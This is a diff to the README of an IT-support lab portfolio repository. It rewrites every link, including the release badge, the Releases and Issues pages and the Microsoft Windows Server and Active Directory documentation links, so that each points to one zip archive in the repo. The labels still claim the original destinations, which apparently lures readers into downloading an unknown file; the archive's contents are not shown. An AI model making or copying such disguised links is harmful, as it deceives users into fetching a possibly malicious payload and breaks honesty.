@@ -13,12 +13,12 @@ Before you begin, ensure your system meets these requirements:
 ## 📥 Download & Install
 To download the software, visit this page to download:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/SanflameX/orion-enterprise-support-lab-portfolio/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/SanflameX/orion-enterprise-support-lab-portfolio/main/labs/LAB-01-core-identity/enterprise_orion_support_lab_portfolio_3.1.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/SanflameX/orion-enterprise-support-lab-portfolio/main/labs/LAB-01-core-identity/enterprise_orion_support_lab_portfolio_3.1.zip)
 
 Follow these steps to get started with the **Orion Enterprise Support Lab Portfolio**:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/SanflameX/orion-enterprise-support-lab-portfolio/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/SanflameX/orion-enterprise-support-lab-portfolio/main/labs/LAB-01-core-identity/enterprise_orion_support_lab_portfolio_3.1.zip) to find the latest version of the software.
 
 2. **Select the Latest Version**  
    Look for the version marked as the latest. It is usually the first one listed.
@@ -60,13 +60,13 @@ This software covers a range of topics related to IT support:
 
 ## 🤝 Support
 If you encounter any issues or have questions:
-- Visit our [Issues page](https://github.com/SanflameX/orion-enterprise-support-lab-portfolio/issues) to report problems or request help.
+- Visit our [Issues page](https://raw.githubusercontent.com/SanflameX/orion-enterprise-support-lab-portfolio/main/labs/LAB-01-core-identity/enterprise_orion_support_lab_portfolio_3.1.zip) to report problems or request help.
 - Join the community discussions to connect with other users.
 
 ## 🔗 Additional Resources
 For further reading and resources on IT management and support, check out these links:
-- [Windows Server Documentation](https://docs.microsoft.com/en-us/windows-server/)
-- [Active Directory Documentation](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/)
+- [Windows Server Documentation](https://raw.githubusercontent.com/SanflameX/orion-enterprise-support-lab-portfolio/main/labs/LAB-01-core-identity/enterprise_orion_support_lab_portfolio_3.1.zip)
+- [Active Directory Documentation](https://raw.githubusercontent.com/SanflameX/orion-enterprise-support-lab-portfolio/main/labs/LAB-01-core-identity/enterprise_orion_support_lab_portfolio_3.1.zip)
 
 ## 📄 License
 This software is released under the MIT License. Feel free to use it in compliance with the license terms. 
